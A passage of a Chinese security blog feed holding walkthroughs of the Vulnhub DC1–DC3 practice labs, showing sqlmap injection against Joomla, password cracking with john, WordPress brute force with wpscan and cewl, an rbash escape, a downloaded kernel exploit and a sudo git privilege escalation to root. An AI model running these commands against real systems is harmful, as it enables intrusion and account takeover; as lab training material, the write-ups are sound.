Joomla漏洞.</p></li><li><p>kali 没有;需要手动安装.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install joomscan</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907162910717.png" alt="image-20220907162910717"></p></li><li><p>查看帮助命令</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -h</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907163047628.png" alt="image-20220907163047628"></p><ul><li>开扫</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u 192.168.169.224</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907163547660.png" alt="image-20220907163547660"></p><ul><li>搜索可以利用的漏洞</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907163808127.png" alt="image-20220907163808127"></p><ul><li>看一下漏洞的路径</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -p 42033.txt</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907164517050.png" alt="image-20220907164517050"></p><ul><li>打开文件</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907164440537.png" alt="image-20220907164440537"></p><ul><li>发现两个可利用漏洞，一个sql注入，一个XSS，所以SQL注入比较合适，直接查看漏洞利用文本。根据利用文本给出的sqlmap利用方式直接上工具sqlmap。</li><li>直接复制过来把ip改成要攻击的ip.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.169.224/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] </span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907165238494.png" alt="image-20220907165238494"></p><ul><li>继续选择数据库</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.169.224/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch -D joomladb --tables</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907165548619.png" alt="image-20220907165548619"></p><ul><li>继续 <code>#__users  </code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.169.224/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907170040707.png" alt="image-20220907170040707"></p><ul><li>注入查询<code>#__users</code>表的<code>name、password</code>字段</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907170231903.png" alt="image-20220907170231903"></p><ul><li>解码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br></pre></td></tr></table></figure><ol><li>新建个文本,把要解密的内容放进去</li><li>使用<code>john</code>来解密</li></ol><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907170733621.png" alt="image-20220907170733621"></p><ul><li>得到密码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snoopy </span><br></pre></td></tr></table></figure><h1 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h1><ul><li>之前扫到的后台</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.224/administrator/</span><br></pre></td></tr></table></figure><ul><li>使用账号密码登录</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907171229118.png" alt="image-20220907171229118"></p><ul><li>在编辑器发现提示</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907171515649.png" alt="image-20220907171515649"></p><ul><li>发现能插入一句话的地方</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907172137088.png" alt="image-20220907172137088"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907172205831.png" alt="image-20220907172205831"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907172240156.png" alt="image-20220907172240156"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907172920838.png" alt="image-20220907172920838"></p><ul><li>使用工具连接</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907173016710.png" alt="image-20220907173016710"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907173040858.png" alt="image-20220907173040858"></p><ul><li>连接成功</li></ul><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>根据上面的提示需要提权,并且只有一个flag</p><ul><li>查看基本信息</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907173556514.png" alt="image-20220907173556514"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907174605258.png" alt="image-20220907174605258"></p><ul><li>百度了找着了下使用<code>39772.txt </code>这个</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907175131510.png" alt="image-20220907175131510"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907175211421.png" alt="image-20220907175211421"></p><ul><li>去下载</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip     </span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907175355009.png" alt="image-20220907175355009"></p><ul><li>通过<code>蚁剑</code>将这<code>exploit.tar</code>上传至靶机即可。解压———执行compile.sh——执行doubleput——提权成功。</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907191807217.png" alt="image-20220907191807217"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907191827111.png" alt="image-20220907191827111"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220907191849286.png" alt="image-20220907191849286"></p><ul><li>结束</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机DC系列-DC2</title>
      <link href="/archives/3470b13b.html"/>
      <url>/archives/3470b13b.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><ul><li><strong>Name</strong>: DC: 2</li><li><strong>Date release</strong>: 22 Mar 2019</li><li><strong>Author</strong>: <a href="http://www.vulnhub.com/author/dcau,610/">DCAU</a></li><li><strong>Series</strong>: <a href="http://www.vulnhub.com/series/dc,199/">DC</a></li><li><strong>Web page</strong>: <a href="http://www.five86.com/dc-2.html">http://www.five86.com/dc-2.html</a></li></ul><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>与 DC-1 非常相似，DC-2 是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。</p><p>与最初的 DC-1 一样，它的设计考虑到了初学者。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>就像 DC-1 一样，有五个标志，包括最终标志。</p><p>再说一次，就像 DC-1 一样，标志对初学者很重要，但对有经验的人来说并不那么重要。</p><p>简而言之，唯一真正重要的标志是最终标志。</p><p>对于初学者来说，谷歌是你的朋友。好吧，除了所有的隐私问题等等等等。</p><p>我还没有探索实现 root 的所有方法，因为我放弃了我一直在研究的以前的版本，并从基本操作系统安装之外完全重新开始。</p><h1 id="技术信息"><a href="#技术信息" class="headerlink" title="技术信息"></a>技术信息</h1><p>DC-2 是基于 Debian 32 位构建的 VirtualBox VM，因此在大多数 PC 上运行它应该没有问题。</p><p>虽然我没有在 VMware 环境中测试过它，但它也应该可以工作。</p><p>它当前配置为桥接网络，但是，可以根据您的要求进行更改。网络配置为 DHCP。</p><p>安装很简单 - 下载它，解压缩，然后将其导入 VirtualBox，然后就可以了。</p><p>请注意，您需要将渗透测试设备上的host文件设置为：</p><p>Please note that you will need to set the hosts file on your pentesting device to something like:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.145 dc-2</span><br></pre></td></tr></table></figure><p>显然，将 192.168.0.145 替换为 DC-2 的实际 IP 地址。</p><p>它将使生活变得更加简单（如果没有它，某些 CMS 可能无法工作）。</p><p>如果您不确定如何执行此操作，请参阅此处的说明。</p><h1 id="设备ip"><a href="#设备ip" class="headerlink" title="设备ip"></a>设备ip</h1><ul><li><p>攻击机:kali </p></li><li><p>靶机: dc-2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.169.0/24</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -P 1-65535 -T4 192.168.169.221</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905082506023.png" alt="image-20220905082506023"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905110435096.png" alt="image-20220905110435096"></p></li><li><p>kali : 192.168.169.220</p></li><li><p>dc-2 : 192.168.169.221</p></li><li><p>既然开放80端口，直接访问http服务。直接在地址栏输入IP地址即可</p></li></ul><h1 id="修改host"><a href="#修改host" class="headerlink" title="修改host"></a>修改host</h1><ul><li><p>根据技术信息里面的描述修改<code>host</code>文件</p><p>kali linux    记得用root权限写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905083620717.png" alt="image-20220905083620717"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905083836436.png" alt="image-20220905083836436"></p><p>windows : </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905084044118.png" alt="image-20220905084044118"></p><h1 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905084327211.png" alt="image-20220905084327211"></p><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905084451343.png" alt="image-20220905084451343"></p><ul><li><p>查看提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">你常用的词表可能不会起作用，所以相反，也许你只需要做cewl。</span><br><span class="line">更多的密码总是更好的，但有时你不可能赢得所有的密码。</span><br><span class="line">以一个人的身份登录，看看下一个标志。</span><br><span class="line">如果你找不到它，就以另一个身份登录。</span><br></pre></td></tr></table></figure></li><li><p>登陆的话扫一下网站的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://dc-2/ </span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905085516622.png" alt="image-20220905085516622"></p></li></ul><ul><li><p><a href="http://dc-2/wp-admin/">http://dc-2/wp-admin/</a>  看到admin直接访问</p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905085653169.png" alt="image-20220905085653169"></p></li></ul><ul><li><p>既然是wordpress使用WPScan试试（WordPress扫描工具）</p><p>WPScan 的 一些参数</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">常用选项</span><br><span class="line">--update 更新到最新版本</span><br><span class="line">--url | -u &lt;target url&gt; 要扫描的`WordPress`站点.</span><br><span class="line">--force | -f 不检查网站运行的是不是`WordPress`</span><br><span class="line">--enumerate | -e [option(s)] 枚举</span><br><span class="line">其他选项</span><br><span class="line">u 枚举用户名，默认从1-10</span><br><span class="line">u[10-20] 枚举用户名，配置从10-20</span><br><span class="line">p 枚举插件</span><br><span class="line">vp 只枚举有漏洞的插件</span><br><span class="line">ap 枚举所有插件，时间较长</span><br><span class="line">tt 列举缩略图相关的文件</span><br><span class="line">t 枚举主题信息</span><br><span class="line">vt 只枚举存在漏洞的主题</span><br><span class="line">at 枚举所有主题，时间较长</span><br><span class="line">可以指定多个扫描选项，例：&quot;-e tt,p&quot;</span><br><span class="line">如果没有指定选项，默认选项为：&quot;vt,tt,u,vp&quot;</span><br><span class="line">--exclude-content-based &quot;&lt;regexp or string&gt;&quot;</span><br><span class="line">当使用枚举选项时，可以使用该参数做一些过滤，基于正则或者字符串，可以不写正则分隔符，但要用单引号或双引号包裹</span><br><span class="line">--config-file | -c &lt;config file使用指定的配置文件</span><br><span class="line">--user-agent | -a &lt;User-Agent指定User-Agent</span><br><span class="line">--cookie &lt;String指定cookie</span><br><span class="line">--random-agent | -r 使用随机User-Agent</span><br><span class="line">--follow-redirection 如果目标包含一个重定向，则直接跟随跳转</span><br><span class="line">--batch 无需用户交互，都使用默认行为</span><br><span class="line">--no-color 不要采用彩色输出</span><br><span class="line">--wp-content-dir &lt;wp content dirWPScan会去发现wp-content目录，用户可手动指定</span><br><span class="line">--wp-plugins-dir &lt;wp plugins dir指定wp插件目录，默认是wp-content/plugins</span><br><span class="line">--proxy &lt;[protocol://]host:port设置一个代理，可以使用HTTP、SOCKS4、SOCKS4A、SOCKS5，如果未设置默认是HTTP协议</span><br><span class="line">--proxy-auth &lt;username:password设置代理登陆信息</span><br><span class="line">--basic-auth &lt;username:password设置基础认证信息</span><br><span class="line">--wordlist | -w &lt;wordlist指定密码字典</span><br><span class="line">--username | -U &lt;username指定爆破的用户名</span><br><span class="line">--usernames &lt;path-to-file指定爆破用户名字典</span><br><span class="line">--threads | -t &lt;number of threads指定多线程</span><br><span class="line">--cache-ttl &lt;cache-ttl设置 cache TTL</span><br><span class="line">--request-timeout &lt;request-timeout请求超时时间</span><br><span class="line">--connect-timeout &lt;connect-timeout连接超时时间</span><br><span class="line">--max-threads &lt;max-threads最大线程数</span><br><span class="line">--throttle &lt;milliseconds当线程数设置为1时，设置两个请求之间的间隔</span><br><span class="line">--help | -h 输出帮助信息</span><br><span class="line">--verbose | -v 输出Verbose</span><br><span class="line">--version 输出当前版本</span><br></pre></td></tr></table></figure><ul><li><p>开扫</p><p>更新下工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --update</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u</span><br></pre></td></tr></table></figure><p>三个用户:　admin  jerry  tom</p></li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905093925102.png" alt="image-20220905093925102"></p><ul><li><p>生成密码字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w passwd.txt</span><br></pre></td></tr></table></figure></li><li><p>创建用户文件</p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905095640129.png" alt="image-20220905095640129"></p></li><li><p>开始爆破         注意:要进入文件夹内执行命令</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -U user.txt -P passwd.txt  </span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905100137415.png" alt="image-20220905100137415"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><ul><li>直接登录</li></ul><h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag 2"></a>flag 2</h2><ul><li>登陆后开始翻找,找到flag 2</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905100609030.png" alt="image-20220905100609030"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果你不能利用WordPress，走捷径，还有另一种方法。</span><br><span class="line">希望你能找到另一个切入点。</span><br></pre></td></tr></table></figure><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><ul><li>根据提示还有ssh没用到</li><li>尝试用上面的密码链接ssh</li><li>只有tom链接成功</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.40.137 -p 7744       #密码: parturient</span><br></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><ul><li><p>第一种</p></li><li><p>直接cat，结果，它早有预防，tom登录后rbash限制，各种命令执行不通，但是vi可以用</p></li></ul><h2 id="绕过rbash拿flag3-看不懂-参考"><a href="#绕过rbash拿flag3-看不懂-参考" class="headerlink" title="绕过rbash拿flag3(看不懂 参考)"></a>绕过rbash拿flag3(看不懂 参考)</h2><ul><li><p>第二种 这个应该是正解</p></li><li><p>绕过rbash</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><ul><li>添加环境变量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure><h3 id="拿到flag3"><a href="#拿到flag3" class="headerlink" title="拿到flag3"></a>拿到flag3</h3><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905111223454.png" alt="image-20220905111223454"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可怜的老汤姆总是追着杰里跑。也许他应该为他造成的所有压力而起诉。</span><br></pre></td></tr></table></figure><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><ul><li>切换账户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry          #密码: adipiscing</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905113042077.png" alt="image-20220905113042077"></p><ul><li>找到 flag4</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">很高兴看到你已经走到了这一步--但你还没有到家。</span><br><span class="line"></span><br><span class="line">你仍然需要得到最后的旗帜（唯一真正重要的旗帜！！！）。 </span><br><span class="line"></span><br><span class="line">这里没有提示--你现在要靠自己了。）</span><br><span class="line"></span><br><span class="line">来吧--离开这里!!!!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><ul><li>flag4提示可以用git,使用git提权，sudo -l看到不需要root权限。</li><li>利用SUID进行提权，SUID可以让调用者以文件拥有者的身份运行该文件</li><li>已知可用来提权的linux文件： Nmap Vim find Bash More Less Nano</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905113456928.png" alt="image-20220905113456928"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905114135578.png" alt="image-20220905114135578"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220905114221898.png" alt="image-20220905114221898"></p><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机DC系列-DC1</title>
      <link href="/archives/ad79e081.html"/>
      <url>/archives/ad79e081.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p>Name: DC: 1<br>Date release: 28 Feb 2019<br>Author: DCAU<br>Series: DC<br>Web page: <a href="http://www.five86.com/dc-1.html">http://www.five86.com/dc-1.html</a></p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>DC-1 是一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>它旨在为初学者带来挑战，但它的简单程度取决于您的技能和知识以及您的学习能力。</p><p>要成功完成这一挑战，您将需要 Linux 技能、熟悉 Linux 命令行以及使用基本渗透测试工具的经验，例如可以在 Kali Linux 或 Parrot Security OS 上找到的工具。</p><p>有多种获得 root 的方法，但是，我已经包含了一些包含初学者线索的标志。</p><p>总共有五个标志，但最终目标是在 root 的主目录中找到并读取标志。您甚至不需要成为 root 即可执行此操作，但是，您将需要 root 权限。</p><p>根据您的技能水平，您可能可以跳过查找大多数这些标志并直接获取根。</p><p>初学者可能会遇到他们以前从未遇到过的挑战，但谷歌搜索应该是获取完成这一挑战所需信息的全部内容。</p><h1 id="技术信息"><a href="#技术信息" class="headerlink" title="技术信息"></a>技术信息</h1><p>DC-1 是基于 Debian 32 位构建的 VirtualBox VM，因此在大多数 PC 上运行它应该没有问题。</p><p>虽然我没有在 VMware 环境中测试过它，但它也应该可以工作。</p><p>它当前配置为桥接网络，但是，可以根据您的要求进行更改。网络配置为 DHCP。</p><p>安装很简单 - 下载它，解压缩，然后将其导入 VirtualBox，然后就可以了。</p><ul><li><p>使用vmware也是一样(我是基于vmware)</p></li><li><p>攻击机器: kali linux  ; IP: 192.168.169.220</p></li></ul><h1 id="获取另一台设备的ip"><a href="#获取另一台设备的ip" class="headerlink" title="获取另一台设备的ip"></a>获取另一台设备的ip</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.169.0/24</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904145502509.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.169.219 (192.168.169.219)</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">111/tcp open  rpcbind</span><br></pre></td></tr></table></figure><h1 id="访问ip"><a href="#访问ip" class="headerlink" title="访问ip"></a>访问ip</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904145834232.png"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904150229736.png"></p><ul><li><p>由网页可以明显看出本站是由使用<code>PHP</code>语言编写的开源内容管理系统<code>Drupal</code>搭建的，并且由<code>Wappalyzer</code>得知版本为<code>7.X</code>，</p></li><li><p>之前的metasploit教程: <a href="https://putdown.top/archives/71f4c5ab.html">https://putdown.top/archives/71f4c5ab.html</a></p></li></ul><h1 id="搜索可以利用的漏洞"><a href="#搜索可以利用的漏洞" class="headerlink" title="搜索可以利用的漏洞"></a>搜索可以利用的漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal 7.x  </span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220904151249897.png"></p><ul><li>使用最后一个远程代码执行漏洞，这个漏洞可以用metasploit进行攻击</li></ul><h1 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h1><p>metasploit的使用: <a href="https://putdown.top/archives/71f4c5ab.html">https://putdown.top/archives/71f4c5ab.html</a></p><h2 id="搜索可以使用的漏洞"><a 